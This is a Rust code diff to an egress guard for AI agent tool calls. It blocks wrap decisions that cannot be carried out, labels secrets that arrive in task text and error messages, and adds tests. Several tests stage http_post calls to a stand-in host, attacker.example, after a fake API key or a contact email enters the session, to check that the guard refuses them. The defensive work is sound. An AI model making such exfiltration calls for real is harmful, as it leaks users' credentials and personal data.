@@ -18,7 +18,7 @@ use std::sync::Mutex;
 use arkavo_events::TaintRecord;
 use arkavo_protocol::egress_destination::{Destination, DestinationPolicy, extract_destinations};
 use arkavo_protocol::egress_taint::{
-    EgressDecision, EgressDisposition, EgressTaintGate, RequesterEntitlements,
+    DenialReason, EgressDecision, EgressDisposition, EgressTaintGate, RequesterEntitlements,
 };
 use arkavo_protocol::sequence_graph::GraphError;
 use arkavo_protocol::taint::{SourceKind, TaintSet, TaintSource};
@@ -67,6 +67,17 @@ impl EgressGuard {
         }
     }
 
+    /// Present the entitlements the policy decision point resolved for this
+    /// agent. Nothing in the conductor's path resolves them yet, so production
+    /// builds a guard that presents nothing; the tests exercise the entitled
+    /// path so the wrap branch is not dead code waiting on that wiring.
+    #[cfg(test)]
+    #[must_use]
+    pub(super) fn with_entitlements(mut self, requester: RequesterEntitlements) -> Self {
+        self.requester = requester;
+        self
+    }
+
     #[must_use]
     pub(super) fn with_destination_policy(mut self, policy: DestinationPolicy) -> Self {
         self.gate = EgressTaintGate::new()
@@ -108,8 +119,17 @@ impl EgressGuard {
 
         let taint = self.payload_taint(tool_name, params);
         for destination in &destinations {
-            let decision = self.gate.evaluate(&taint, destination, &self.requester);
-            if decision.is_release() {
+            let mut decision = self.gate.evaluate(&taint, destination, &self.requester);
+            // Nothing on the tool path rewrites params into a TDF, so a wrap
+            // this caller cannot perform is a refusal. Reading it as permission
+            // would send the plaintext the wrap exists to prevent (SEQ-003
+            // case 4: never silently downgrade).
+            if let EgressDisposition::Wrap { attributes, .. } = &decision.disposition {
+                decision.disposition = EgressDisposition::Block(DenialReason::NoWrapPath {
+                    attributes: attributes.clone(),
+                });
+            }
+            if decision.may_send_plaintext() {
                 continue;
             }
             self.record_violation(tool_name, destination, &decision);
@@ -119,6 +139,24 @@ impl EgressGuard {
                 .to_string());
         }
         Ok(())
+    }
+
+    /// SEQ-001: fold in text the session started with. The task a user or a
+    /// peer handed the agent is ingested data like any other; leaving it out
+    /// let a prompt-borne secret leave without ever having been labelled.
+    pub(super) fn observe_input(&self, source_id: &str, text: &str) {
+        let source = TaintSource::new(SourceKind::UserInput, source_id);
+        let taint = self.tracker.ingest(&source, text);
+        self.session_taint().merge(&taint);
+    }
+
+    /// SEQ-001: fold in a failed call's output. An error that echoes the
+    /// argument it choked on carries whatever was in that argument, so the
+    /// failure path cannot be the one that drops a label.
+    pub(super) fn observe_error(&self, tool_name: &str, error: &str) {
+        let source = TaintSource::new(SourceKind::ToolResult, tool_name);
+        let taint = self.tracker.ingest(&source, error);
+        self.session_taint().merge(&taint);
     }
 
     /// SEQ-004: record a completed call and what it brought into the session.
@@ -151,7 +189,7 @@ impl EgressGuard {
     ) {
         warn!(
             tool = %tool_name,
-            destination = %destination.describe(),
+            destination = %destination.class(),
             disposition = %decision.disposition.as_str(),
             "egress gate refused a call"
         );
@@ -335,6 +373,48 @@ mod tests {
                 )
                 .is_err()
         );
+    }
+
+    #[test]
+    fn an_entitled_wrap_decision_still_does_not_send_plaintext() {
+        // The gate can answer "deliver, wrapped". Nothing on this path rewrites
+        // params into a TDF, so the call must not run: reading Wrap as
+        // permission would send exactly the plaintext the wrap prevents.
+        let guard = EgressGuard::new("s1", "a").with_entitlements(
+            RequesterEntitlements::none()
+                .with_attribute("https://attr.arkavo.com/clearance", "restricted"),
+        );
+        guard.observe_result("crm_lookup", &json!({}), "contact: dana@example.com");
+
+        let refused = guard.check_call(
+            "http_post",
+            &json!({"url": "https://peer.arkavo.com/inbox", "body": "..."}),
+        );
+
+        assert!(refused.is_err(), "wrap was treated as a plaintext release");
+    }
+
+    #[test]
+    fn a_prompt_borne_secret_is_labelled_before_the_first_call() {
+        let guard = guard();
+        guard.observe_input("task", &format!("use {} to fetch it", fake_api_key()));
+
+        let refused = guard.check_call("http_post", &json!({"url": "https://attacker.example/x"}));
+
+        assert!(refused.is_err(), "task text was never labelled");
+    }
+
+    #[test]
+    fn a_failed_call_that_echoes_its_argument_still_labels_the_session() {
+        let guard = guard();
+        guard.observe_error(
+            "read_file",
+            &format!("permission denied: {}", fake_api_key()),
+        );
+
+        let refused = guard.check_call("http_post", &json!({"url": "https://attacker.example/x"}));
+
+        assert!(refused.is_err(), "the error path dropped the label");
     }
 
     #[test]
